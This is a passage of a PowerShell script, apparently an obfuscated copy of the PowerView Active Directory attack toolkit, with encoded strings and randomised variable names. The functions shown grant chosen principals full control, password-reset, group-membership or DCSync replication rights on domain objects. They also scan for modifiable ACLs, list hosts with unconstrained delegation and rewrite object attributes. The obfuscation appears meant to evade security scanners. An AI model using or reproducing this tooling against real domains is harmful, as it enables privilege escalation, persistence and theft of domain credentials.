                            (HandleResult95 @(240,85,149,181,8,8,174,106,252,96,141,181,54,98,197,66,255,121,254,242) @(165,56,195,207,82,80,252,59)) { (HandleResult95 @(205,56,50,146,142,212,23,66,165,187,193,8,62,129,144,178,38,48,219,185,205,43,34,156,141,215,57,64,165,171,231,8,62,175,131,232,37,39,170,182,206,17,38,156,143,212,53,70) @(128,124,115,235,193)) }
                            (HandleResult95 @(225,229,43,158,69,183,112,249,140,54,223,72,170,126,253,172) @(183,214,97,238,33,240,38)) { (HandleResult95 @(32,210,30,54,141,175,197,76,230,61,66,183,136,225,43,211,9,106,243,189,235,46,238,48,79,148,128,223,54,251,18,119,142,129,228,17,230,19,66,180,136,220,56,143,8,84,150,188) @(121,191,71,3,195,197,166)) }
                            Default { (HandleResult95 @(44,154,156,35,177,17,32,169,144,16,189,33,44,154,156,35,177,22,81,169,144,16,189,34,45,138,156,35,177,17,32,170,144,16,189,34,44,154,156,35,177,17,32,169,144,16,189,34) @(97,222,221,84,252,85))}
                        }
                        if($_.ObjectType -eq $VTpe) { $_ }
                    }
                    else {
                        $_
                    }
                } | Foreach-Object {
                    if($NbbUfhH) {
                        # if we're resolving GUIDs, map them them to the resolved hash table
                        $gakRu = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $gakRu[$_.Name] = $NbbUfhH[$_.Value.toString()]
                                }
                                catch {
                                    $gakRu[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $gakRu[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $gakRu
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Add-ObjectAcl {
<#
    .SYNOPSIS

        Adds an ACL for a specific active directory object.
        
        AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3)
            https://adsecurity.org/?p=1906

        ACE setting method adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects.

        'ResetPassword' doesn't need to know the user's current password
        'WriteMembers' allows for the modification of group membership

    .PARAMETER TargetSamAccountName

        Target object name to filter for.        

    .PARAMETER TargetName

        Target object name to filter for.

    .PARAMETER TargetDistinguishedName

        Target object distinguished name to filter for.

    .PARAMETER TargetFilter

        A customized ldap filter string to use to find a target, e.g. "(description=*admin*)"

    .PARAMETER TargetADSpath

        The LDAP source for the target, e.g. "LDAP://OU=secret,DC=testlab,DC=local"

    .PARAMETER TargetADSprefix

        Prefix to set for the target searcher (like "CN=Sites,CN=Configuration")

    .PARAMETER PrincipalSID

        The SID of the principal object to add for access.

    .PARAMETER PrincipalName

        The name of the principal object to add for access.

    .PARAMETER PrincipalSamAccountName

        The samAccountName of the principal object to add for access.

    .PARAMETER Rights

        Rights to add for the principal, "All","ResetPassword","WriteMembers","DCSync"

    .PARAMETER Domain

        The domain to use for the target query, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john

        Grants 'john' all full access rights to the 'matt' account.

    .EXAMPLE

        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john -Rights ResetPassword

        Grants 'john' the right to reset the password for the 'matt' account.

    .LINK

        https://adsecurity.org/?p=1906
        
        https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,

        [String]
        $TargetName = "*",

        [Alias('DN')]
        [String]
        $TargetDistinguishedName = "*",

        [String]
        $TargetFilter,

        [String]
        $TargetADSpath,

        [String]
        $TargetADSprefix,

        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,

        [String]
        $PrincipalName,

        [String]
        $PrincipalSamAccountName,

        [String]
        [ValidateSet((HandleResult95 @(38,129,127,183) @(119,214,7,196)),(HandleResult95 @(67,69,93,253,61,177,142,89,79,112,69,253,3,219,229,113,76,105,54,186) @(22,40,11,135,103,233,220,8)),(HandleResult95 @(165,151,20,150,16,180,242,16,188,35,194,205,4,190,62,137) @(243,164,94,230,116)),(HandleResult95 @(140,241,178,123,243,137,129,150) @(222,180,252,47,150)))]
        $Rights = (HandleResult95 @(249,144,189,165) @(168,199,197,214,90,149,175,130)),

        [String]
        $RightsGUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $rW6p = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize

        if(!$PrincipalSID) {
            $DPBWW = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            
            if(!$DPBWW) {
                throw (HandleResult95 @(208,34,168,95,140,17,80,190,225,23,180,92,140,16,97,235,227,45,215,72,167,106,91,160,227,45,215,76,143,122,91,177,224,59,223,27) @(130,122,226,38,238,34,25,217))
            }
            $PrincipalSID = $DPBWW.objectsid
        }
        if(!$PrincipalSID) {
            throw (HandleResult95 @(34,169,72,171,18,194,75,181,19,156,84,168,18,195,122,224,17,166,55,188,57,185,64,171,17,166,55,184,17,169,64,186,18,176,63,239) @(112,241,2,210))
        }
    }

    process {

        if ($rW6p) {

            if($TargetSamAccountName) {
                $rW6p.filter=((HandleResult95 @(84,154,67,128,95,45,159,110,182,107,81,179,120,220,106,106,189,93,218,84,125,142,79,214) @(31,217,26,239,60)) + $TargetSamAccountName + (HandleResult95 @(37,119,42,51,121,235,40,48,62,117,127,123) @(110,36,66,70,32,188,25,92)) + $TargetName + (HandleResult95 @(248,159,35,131,78,136,253,252,42,191,26,190,215,155,39,146,78,151,229,167,41,133,105,164,233,152,123,213) @(179,204,75,232,47,208)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
            }
            else {
                $rW6p.filter=((HandleResult95 @(59,99,88,225,207,28,248,49,42,116,49,179) @(112,32,1,142,173,113,190,69)) + $TargetName + (HandleResult95 @(218,142,170,123,154,123,223,237,163,71,206,77,245,138,174,106,154,100,199,182,160,125,189,87,203,137,242,45) @(145,221,194,16,251,35)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
            }
  
            try {
                $rW6p.FindAll() | Where-Object {$_} | Foreach-Object {
                    # adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects

                    $wLA0nXri = $_.Properties.distinguishedname

                    $aQGrugN1 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
                    $uuNJ15 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] (HandleResult95 @(166,246,133,72,169,82,53,169) @(242,155,188,61,243,3,8,148))
                    $qbPIH = [System.Security.AccessControl.AccessControlType] (HandleResult95 @(101,96,111,251,86,4,116,181) @(52,55,23,136))
                    $ZxhUCQ = @()

                    if($RightsGUID) {
                        $NbbUfhH = @($RightsGUID)
                    }
                    else {
                        $NbbUfhH = Switch ($Rights) {
                            # ResetPassword doesn't need to know the user's current password
                            (HandleResult95 @(80,182,31,224,171,93,137,24,195,169,75,161,45,168,200,124,129,8,167,204) @(5,219,73,154,241)) { (HandleResult95 @(9,65,74,142,128,105,47,52,69,141,142,73,9,111,90,197,149,126,116,125,70,160,158,74,8,82,78,196,129,87,35,113,70,179,141,85,29,81,74,128,129,80,17,114,69,163,134,8) @(68,5,11,247,207,61)) }
                            # allows for the modification of group membership
                            (HandleResult95 @(224,7,234,160,210,115,246,158,236,99,145,185,236,108,234,170) @(182,52,160,208)) { (HandleResult95 @(156,150,242,222,86,217,75,240,162,209,170,108,254,111,151,151,229,130,40,203,101,146,170,220,167,79,246,81,138,191,254,159,85,247,106,173,162,255,170,111,254,82,132,203,228,188,77,202) @(197,251,171,235,24,179,40)) }
                            # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                            # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                            # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                            #   when applied to a domain's ACL, allows for the use of DCSync
                            (HandleResult95 @(133,3,254,15,0,1,226,44) @(215,70,176,91,101,86)) { (HandleResult95 @(231,113,191,10,11,178,177,136,243,114,191,4,9,178,165,205,228,92,202,8,11,178,185,194,230,114,163,67,9,178,177,206,231,97,184,26,11,161,186,215,243,95,176,27,31,215,185,195) @(170,37,250,112,70,229,232,186)), (HandleResult95 @(238,106,150,201,131,30,163,145,103,132,226,186,6,173,238,73,157,202,254,49,183,244,111,171,255,153,16,201,236,105,138,199,131,13,184,201,115,151,225,163,16,128,233,85,138,129,159,48) @(163,62,211,179,206,73,250)), (HandleResult95 @(191,137,239,74,55,124,166,164,205,92,33,92,190,137,210,22,34,107,192,253,218,92,33,81,188,153,232,19,53,127,181,185,206,97,34,64,169,255,201,74,34,111,181,255,205,98,58,66) @(240,205,131,38,120,40))}
                        }
                    }

                    if($NbbUfhH) {
                        foreach($GUID in $NbbUfhH) {
                            $HjYO7t = New-Object Guid $GUID
                            $GxCkDuL = [System.DirectoryServices.ActiveDirectoryRights] (HandleResult95 @(222,153,235,34,14,224,58,231,155,212,64,7,214,88,232,174,231,83,105,138) @(140,193,131,18,84,183,15))
                            $ZxhUCQ += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aQGrugN1,$GxCkDuL,$qbPIH,$HjYO7t,$uuNJ15
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        $GxCkDuL = [System.DirectoryServices.ActiveDirectoryRights] (HandleResult95 @(203,184,234,169,46,11,211,250,229,236,50,32,251,203,129,225) @(153,138,188,220,116,83))
                        $ZxhUCQ += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $aQGrugN1,$GxCkDuL,$qbPIH,$uuNJ15
                    }

                    Write-Verbose ((HandleResult95 @(175,103,133,162,76,201,175,36,173,167,77,192,158,28,133,186,76,202,179,36,172,141,104,212,180,21,242,247) @(253,84,207,202,46,167)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $Rights + (HandleResult95 @(186,183,217,37,200,98,194,205) @(240,206,155,83,170,11,131)) + $($_.Properties.distinguishedname))

                    try {
                        # add all the new ACEs to the specified object
                        ForEach ($CDdB1kj in $ZxhUCQ) {
                            Write-Verbose ((HandleResult95 @(61,66,247,199,205,188,158,31,19,208,204,200,177,132,37,1,223,194,225,162,175,40,55,206,230,238,239,241) @(111,113,189,175,175,210,204)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $($CDdB1kj.ObjectType) + (HandleResult95 @(239,166,60,112,48,242,187,17,109,25,232,184,28,59,101,194) @(165,223,126,9,81)) + $($_.Properties.distinguishedname))
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($CDdB1kj)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning ((HandleResult95 @(189,164,88,221,200,144,166,155,72,151,224,203,141,146,64,212,200,206,140,155,113,236,224,211,141,145,92,212,201,228,169,143,91,229,151,158) @(239,252,18,164,170,163)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $Rights + (HandleResult95 @(187,61,118,89,88,34,101,204) @(241,68,52,47,58,75,36)) + $wLA0nXri + (HandleResult95 @(72,97,13,111) @(1,37,98,8,135,3,34,226)) + $_)
                    }
                }
            }
            catch {
                Write-Warning ((HandleResult95 @(198,173,19,144,53,137,42,52,221,180,100,212) @(148,245,89,233,87,186,99,2)) + $_)
            }
        }
    }
}


function Invoke-ACLScanner {
<#
    .SYNOPSIS
        Searches for ACLs for specifable AD objects (default to all domain objects)
        with a domain sid of > -1000, and have modifiable rights.

        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.

    .PARAMETER SamAccountName

        Object name to filter for.        

    .PARAMETER Name

        Object name to filter for.

    .PARAMETER DistinguishedName

        Object distinguished name to filter for.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"
     
    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ADSprefix

        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")

    .PARAMETER Domain

        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ResolveGUIDs

        Switch. Resolve GUIDs to their display names.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Invoke-ACLScanner -ResolveGUIDs | Export-CSV -NoTypeInformation acls.csv

        Enumerate all modifable ACLs in the current domain, resolving GUIDs to display 
        names, and export everything to a .csv
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $DistinguishedName = "*",

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveGUIDs,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    # Get all domain ACLs with the appropriate parameters
    Get-ObjectACL @PSBoundParameters | ForEach-Object {
        # add in the translated SID for the object identity
        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | Where-Object {
        # check for any ACLs with SIDs > -1000
        try {
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | Where-Object {
        # filter for modifiable rights
        ($_.ActiveDirectoryRights -eq (HandleResult95 @(222,29,106,29,172,224,195,252,118,12,46,133,218,200,177,18) @(140,47,60,104,246,184,137))) -or ($_.ActiveDirectoryRights -match (HandleResult95 @(55,45,229,35,105,38,75,146) @(97,30,175,83,13))) -or ($_.ActiveDirectoryRights -match (HandleResult95 @(103,20,72,205,188,47,100,75) @(54,39,2,161,229,119))) -or ($_.ActiveDirectoryRights -match (HandleResult95 @(197,25,112,98,214,237,197,50) @(151,94,38,17,140,181))) -or (($_.ActiveDirectoryRights -match (HandleResult95 @(38,112,191,38,46,127,226,125,46,127,133,69,21,127,179,121,16,105,234,43) @(116,40,215,22))) -and ($_.AccessControlType -eq (HandleResult95 @(101,249,240,8,72,7,205,181) @(52,174,136,123,42))))
    }
}


function Get-GUIDMap {
<#
    .SYNOPSIS

        Helper to build a hash table of [GUID] -> resolved names

        Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

    .PARAMETER Domain
    
        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController
    
        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .LINK

        http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [CmdletBinding()]
    Param (
        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $NbbUfhH = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $pz38h3z = (Get-NetForest).schema.name

    $LhzCAd = Get-DomainSearcher -ADSpath $pz38h3z -DomainController $DomainController -PageSize $PageSize
    if($LhzCAd) {
        $LhzCAd.filter = (HandleResult95 @(8,40,175,24,51,183,90,192,26,53,141,55,0,193,90,254,17,36,209,3,25,161,49,137) @(67,96,225,114,82,240,12,180))
        try {
            $LhzCAd.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $NbbUfhH[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug ((HandleResult95 @(104,163,84,208,12,247,115,156,127,254,90,163,99,149,72,217,12,131,104,139,124,196,13,163,104,202,72,227,60,135,120,143,71,241,47,242,115,186,35,148) @(58,251,30,169,110,196)) + $_)
        }      
    }

    $nQTC3CX = Get-DomainSearcher -ADSpath $pz38h3z.replace((HandleResult95 @(107,122,51,146,250,13,15,76) @(62,72,125,253,160,90,62,36)),(HandleResult95 @(120,159,110,185,112,144,51,226,112,144,87,253,127,170,106,231,75,143,84,243) @(42,199,6,137))) -DomainController $DomainController -PageSize $PageSize
    if ($nQTC3CX) {
        $nQTC3CX.filter = (HandleResult95 @(99,246,132,186,34,114,120,66,213,248,157,48,70,118,102,203,237,132,13,105,76,70,227,196,177,113,103,108,113,131,243,191,32,44,96,123,208,234,183,44,123,109,67,140) @(40,177,189,211,67,31,46))
        try {
            $nQTC3CX.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $NbbUfhH[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug ((HandleResult95 @(156,205,134,13,208,149,21,169,244,155,64,213,255,50,152,229,174,51,224,214,62,163,246,171,38,131,240,22,156,214,142,0,235,254,29,248,220,141,73,143) @(206,149,204,116,178,166,92)) + $_)
        }
    }

    $NbbUfhH
}


function Get-NetComputer {
<#
    .SYNOPSIS

        This function utilizes adsisearcher to query the current AD context
        for current computer objects. Based off of Carlos Perez's Audit.psm1
        script in Posh-SecMod (link below).

    .PARAMETER ComputerName

        Return computers with a specific name, wildcards accepted.

    .PARAMETER SPN

        Return computers with a specific service principal name, wildcards accepted.

    .PARAMETER OperatingSystem

        Return computers with a specific operating system, wildcards accepted.

    .PARAMETER ServicePack

        Return computers with a specific service pack, wildcards accepted.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER Printers

        Switch. Return only printers.

    .PARAMETER Ping

        Switch. Ping each host to ensure it's up before enumerating.

    .PARAMETER FullData

        Switch. Return full computer objects instead of just system names (the default).

    .PARAMETER Domain

        The domain to query for computers, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Unconstrained

        Switch. Return computer objects that have unconstrained delegation.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetComputer
        
        Returns the current computers in current domain.

    .EXAMPLE

        PS C:\> Get-NetComputer -SPN mssql*
        
        Returns all MS SQL servers on the domain.

    .EXAMPLE

        PS C:\> Get-NetComputer -Domain testing
        
        Returns the current computers in 'testing' domain.

    .EXAMPLE

        PS C:\> Get-NetComputer -Domain testing -FullData
        
        Returns full computer objects in the 'testing' domain.

    .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem,

        [String]
        $ServicePack,

        [String]
        $Filter,

        [Switch]
        $Printers,

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $JlVwn73I = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {

        if ($JlVwn73I) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose (HandleResult95 @(72,182,82,22,223,112,202,107,31,235,40,234,77,57,230,107,231,109,60,214,127,182,53,9,216,69,214,104,29,210,80,227,96,76,208,45,229,71,60,209,127,183,77,25,216,74,177,110,28,142,40,254,96,54,246,117,229,83,75,208,71,199,70,21,230,74,252,104,36,142,91,180,101,41,133,104) @(29,132,4,126,188))
                $Filter += (HandleResult95 @(64,117,197,75,221,151,203,144,82,15,221,71,227,152,180,226,90,15,170,68,227,135,203,164,105,121,252,73,203,165,200,167,68,121,194,70,203,165,196,170,70,71,198,0,201,166,181,170,71,87,194,68,200,139,192,168,68,87,163,0,202,165,208,171,68,121,244,65) @(11,61,147,49,135,207,129,210))
            }
            # set the filters for the seracher if it exists
            if($Printers) {
                Write-Verbose (HandleResult95 @(67,104,173,47,179,123,20,148,38,135,35,52,178,0,138,96,57,146,5,167,117,55,151,50,180,81,12,130,36,167,43,103) @(22,90,251,71,208))
                # $CompSearcher.filter="(&(objectCategory=printQueue)$Filter)"
                $Filter += (HandleResult95 @(213,15,146,229,134,243,30,193,232,162,208,32,207,203,177,240,42,152,198,210,206,16,233,245,134,201,125,155,217,191,200,36,207,219,178,238) @(158,72,171,140,231))
            }
            if($SPN) {
                Write-Verbose ((HandleResult95 @(179,186,239,215,195,139,198,214,222,247,211,230,240,248,250,144,235,208,253,202,132,186,136,200,196,190,218,213,220,206,171,239,221,141,204,214,233,250,253,244,179,205,141,137,233,167,181,132) @(230,136,185,191,160)) + $SPN)
                $Filter += ((HandleResult95 @(94,20,162,115,90,44,176,101,5,222,73,104,33,135,121,41,181,45,85,53,179,66,36,163,70,110,115,134,69,13,209,34) @(21,92,236,31,57,66,234)) + $SPN + ")")
            }
            if($OperatingSystem) {
                $Filter += ((HandleResult95 @(206,115,103,41,237,75,207,92,58,25,219,102,223,7,16,107,212,32,215,88,60,10,135,46) @(133,52,94,94,183,19)) + $OperatingSystem + ")")
            }
            if($ServicePack) {
                $Filter += ((HandleResult95 @(233,198,96,138,155,222,255,155,198,198,53,136,155,181,251,198,193,178,11,145,163,222,251,159,193,239,3,141,152,180,227,132,251,214,23,143,145,215,136,206) @(162,129,89,253,193,134,181,243)) + $ServicePack + ")")
            }

            $JlVwn73I.filter = ((HandleResult95 @(74,6,97,242,178,113,149,79,20,111,211,187,35,224,87,48,92,219,131,116,176,70,16,1,210,149,0,226,76,63,121,175,156,59,138,52,14,107,245,186,35,189,79,42,90,174,159,113,177,108,3,76,199,133,113,238) @(1,69,56,157,209,65,211)) + $ComputerName + ")" + $Filter + ")")

            try {

                $JlVwn73I.FindAll() | Where-Object {$_} | ForEach-Object {
                    $yssh = $True
                    if($Ping) {
                        # TODO: how can these results be piped to ping for a speedup?
                        $yssh = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if($yssh) {
                        # return full data objects
                        if ($FullData) {
                            # convert/process the LDAP fields for each result
                            Convert-LDAPProperty -Properties $_.Properties
                        }
                        else {
                            # otherwise we're just returning the DNS host name
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning ((HandleResult95 @(146,63,118,170,201,243,46,10,154,234,253,90) @(192,103,60,211,171)) + $_)
            }
        }
    }
}


function Get-ADObject {
<#
    .SYNOPSIS

        Takes a domain SID and returns the user, group, or computer object
        associated with it.

    .PARAMETER SID

        The SID of the domain object you're querying for.

    .PARAMETER Name

        The Name of the domain object you're querying for.

    .PARAMETER SamAccountName

        The SamAccountName of the domain object you're querying for. 

    .PARAMETER Domain

        The domain to query for objects, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Filter

        Additional LDAP filter string for the query.

    .PARAMETER ReturnRaw

        Switch. Return the raw object instead of translating its properties.
        Used by Set-ADObject to modify object properties.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-ADObject -SID "S-1-5-21-2620891829-2411261497-1773853088-1110"
        
        Get the domain object associated with the specified SID.
        
    .EXAMPLE

        PS C:\> Get-ADObject -ADSpath "CN=AdminSDHolder,CN=System,DC=testlab,DC=local"
        
        Get the AdminSDHolder object for the testlab.local domain.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $ReturnRaw,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if($SID) {
            # if a SID is passed, try to resolve it to a reachable domain name for the searcher
            try {
                $Name = Convert-SidToName $SID
                if($Name) {
                    $HXIxcvgg = Convert-NT4toCanonical -ObjectName $Name
                    if($HXIxcvgg) {
                        $Domain = $HXIxcvgg.split("/")[0]
                    }
                    else {
                        Write-Warning ((HandleResult95 @(24,174,162,151,252,128,218,45,149,133,184,228,209,161,50,196,137,185,171,221,218,12,184,162,188,221,242,253) @(74,246,232,238,158,179,147)) + $SID + "'")
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning ((HandleResult95 @(251,5,215,216,89,98,224,58,254,204,109,43,203,111,229,147,90,6,156,51,212,231,117,27,251,30,220,207) @(169,93,157,161,59,81)) + $SID + (HandleResult95 @(104,254,12,253,179,99,186,112) @(34,135,77,203,250)) + $_)
                return $Null
            }
        }

        $svDmY2Ge = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($svDmY2Ge) {

            if($SID) {
                $svDmY2Ge.filter = ((HandleResult95 @(225,37,56,220,34,170,48,52,240,49,47,131,35,170,22,46,250,55,92,142) @(170,102,97,179,64,152,122,69)) + $SID + ")" + $Filter + ")")
            }
            elseif($Name) {
                $svDmY2Ge.filter = ((HandleResult95 @(11,136,95,50,89,25,6,191,92,9,11,73) @(64,203,6,93,59,116)) + $Name + ")" + $Filter + ")")
            }
            elseif($SamAccountName) {
                $svDmY2Ge.filter = ((HandleResult95 @(53,57,202,237,251,150,111,174,47,45,221,232,250,151,127,175,26,63,166,234,250,243,124,227) @(126,122,147,130,152,164,41,218)) + $SamAccountName + ")" + $Filter + ")")
            }

            $svDmY2Ge.FindAll() | Where-Object {$_} | ForEach-Object {
                if($ReturnRaw) {
                    $_
                }
                else {
                    # convert/process the LDAP fields for each result
                    Convert-LDAPProperty -Properties $_.Properties
                }
            }
        }
    }
}


function Set-ADObject {
<#
    .SYNOPSIS

        Takes a SID, name, or SamAccountName to query for a specified
        domain object, and then sets a specified 'PropertyName' to a
        specified 'PropertyValue'.

    .PARAMETER SID

        The SID of the domain object you're querying for.

    .PARAMETER Name

        The Name of the domain object you're querying for.

    .PARAMETER SamAccountName

        The SamAccountName of the domain object you're querying for. 

    .PARAMETER Domain

        The domain to query for objects, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER Filter

        Additional LDAP filter string for the query.

    .PARAMETER PropertyName

        The property name to set.

    .PARAMETER PropertyValue

        The value to set for PropertyName

    .PARAMETER PropertyXorValue

        Integer value to binary xor (-bxor) with the current int value.

    .PARAMETER ClearValue

        Switch. Clear the value of PropertyName

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName countrycode -PropertyValue 0
        
        Set the countrycode for matt.admin to 0

    .EXAMPLE

        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName useraccountcontrol -PropertyXorValue 65536
        
        Set the password not to expire on matt.admin
#>

    [CmdletBinding()]
    Param (
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Parameter(Mandatory = $True)]
        [String]
        $PropertyName,

        $PropertyValue,

        [Int]
        $PropertyXorValue,

        [Switch]
        $ClearValue,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $GM6i = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
    }
    # splat the appropriate arguments to Get-ADObject
    $NsyC = Get-ADObject -ReturnRaw @GM6i
    
    try {
        # get the modifiable object for this search result
        $TFDp2u = $NsyC.GetDirectoryEntry()
        
        if($ClearValue) {
            Write-Verbose (HandleResult95 @(66,243,106,66,145,75,139,98,76,165,112,166,118,67,142,96,165,69,123,245) @(19,193,18,46,200))
            $TFDp2u.$PropertyName.clear()
            $TFDp2u.commitchanges()
        }

        elseif($PropertyXorValue) {
            $MQScv = $TFDp2u.$PropertyName[0].GetType().name

            # UAC value references- https://support.microsoft.com/en-us/kb/305144
            $PropertyValue = $($TFDp2u.$PropertyName) -bxor $PropertyXorValue 
            $TFDp2u.$PropertyName = $PropertyValue -as $MQScv       
            $TFDp2u.commitchanges()     
        }

        else {
            $TFDp2u.put($PropertyName, $PropertyValue)
            $TFDp2u.setinfo()
        }
    }
    catch {
